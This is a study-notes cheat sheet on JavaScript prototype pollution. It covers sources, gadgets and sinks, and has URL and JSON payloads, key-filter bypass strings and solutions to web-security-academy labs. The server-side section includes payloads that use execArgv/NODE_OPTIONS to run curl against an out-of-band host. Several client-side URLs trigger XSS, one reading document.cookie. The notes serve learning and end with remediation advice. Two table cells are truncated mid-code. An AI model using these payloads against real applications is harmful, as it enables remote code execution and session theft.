# JS Prototype Pollution

Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.

|**Component**|**Role**|**Common Examples**|**Code Example**|
|---|---|---|---|
|**Source**|**The Entry Point.**<br><br>  <br><br>Where untrusted input enters the application and is dangerously merged into an object.|• recursive merge functions<br><br>  <br><br>• URL query parsers (e.g., `qs`, `minimist`)<br><br>  <br><br>• JSON payload handlers|`merge(target, JSON.parse(userInput))`<br><br>  <br><br>_Input: `{"__proto__": {"debug": true}}`_|
|**Gadget**|**The "Sleeper Agent."**<br><br>  <br><br>Legitimate code that looks for a property, finds it undefined, and falls back to the polluted prototype.|• Configuration loaders<br><br>  <br><br>• "Option" objects in libraries<br><br>  <br><br>• `if (config.isAdmin)` checks|`const shell = options.shell|
|**Sink**|**The Execution Zone.**<br><br>  <br><br>The dangerous function where the gadget eventually feeds the polluted data to cause harm.|• **Client:** `innerHTML`, `document.write`<br><br>  <br><br>• **Server:** `child_process.spawn`, `eval`, `vm.runInNewContext`|`child_process.spawn(shell, ...)`<br><br>  <br><br>_Executes the polluted command, leading to RCE._|
## Sources
### Via the URL

```
test.com/?__proto__[foo]=bar
```

```
?__proto__[polluted]=true
```

```
?constructor[prototype][polluted]=true
```

### Via JSON

```
{
	"__proto__": {
		"evilProperty": "payload"
	}
}
```

```
{"__proto__": {"polluted": true}}
```

Bypass

```
{"constructor": {"prototype": {"polluted": true}}}
```

## Server-side prototype pollution

- [ ] Try to override the default error status code
- [ ] Try JSON spaces override
- [ ] Try a charset override
- [ ] Check for OOB interactions

```
"__proto__":{
	"status":599
}
```

```
"__proto__": { "shell":"node", "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com" }
```

```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://1w2bdz4e6oa00ytizquj0kwiyekgu7jl2.oast.site')"
    ]
}
```

## Code review

Look for

- [ ] merge
- [ ] extend
- [ ] deepCopy
- [ ] defaults

Also check for assignment loops

```
target[key] = source[key]
```


- [ ] Check for flawed key sanitization

```
/?__pro__proto__to__.foo=bar
/?__pro__proto__to__[foo]=bar 
/?__pro__proto__to__.foo=bar 
/?constconstructorructor[protoprototypetype][foo]=bar 
/?constconstructorructor.protoprototypetype.foo=bar
```

## Labs

### DOM XSS via client-side prototype pollution

![searchlogger.js](../attachments/prototype-pollution/image-1.png)

```
0a2c00e903b91645815ec10100cd001c.web-security-academy.net/?__proto__[transport_url]=data:,alert(1);//
```

### DOM XSS via an alternative prototype pollution vector

![searchLoggerAlternate.js](../attachments/prototype-pollution/image-3.png)

```
0a0c00d404f574ab83fae7a3002500bd.web-security-academy.net/?__proto__.sequence=alert(1)-
```

### Placeholder

![](../attachments/prototype-pollution/image-4.png)

```
0a39008e04e67439842b054b00190057.web-security-academy.net/?__pro__proto__to__[transport_url]=data:,alert(1);//
```

### Client-side prototype pollution in third-party libraries

```
<script>
    location="https://0a6d00bc03d6c8ff82742a6100fd005d.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>
```

### Client-side prototype pollution via browser APIs

![](../attachments/prototype-pollution/image-5.png)

```
0ad3005503235e1182dfca4b00bc000b.web-security-academy.net/?__proto__[value]=data:,alert(1)
```

### Bypassing flawed input filters for server-side prototype pollution

Use the constructor instead of `__proto__`.

![](../attachments/prototype-pollution/image-6.png)

## Remediation

- [ ] Use a `MAP` instead of an `Object`.
- [ ] Use the "Null" object. This creates objects that have no prototype
- [ ] Freeze the prototype -- Makes the prototype read-only, but can break older libraries that modify the prototype internally. 
- [ ] Input validation can be used, but can often be trivially bypassed. Last resort.

| **Strategy**                    | **Recommendation**                                                                             | **Implementation Example**                   |
| ------------------------------- | ---------------------------------------------------------------------------------------------- | -------------------------------------------- |
| **1. Use Safe Data Structures** | **High Priority.** Use `Map` for key-value storage instead of plain objects.                   | `let cache = new Map();`                     |
| **2. Null-Prototype Objects**   | **High Priority.** Create objects that do not inherit from `Object.prototype`.                 | `let obj = Object.create(null);`             |
| **3. Schema Validation**        | **Medium Priority.** Use libraries like Joi or Ajv to strictly define allowed JSON structures. | Ensure schema does not allow arbitrary keys. |
| **4. Input Sanitization**       | **Immediate Patch.** Block dangerous keys in merge functions.                                  | `if (key === '**proto**'                     |
| **5. Object Freezing**          | **Defense in Depth.** Prevent any changes to the prototype. (Test thoroughly!)                 | `Object.freeze(Object.prototype);`           |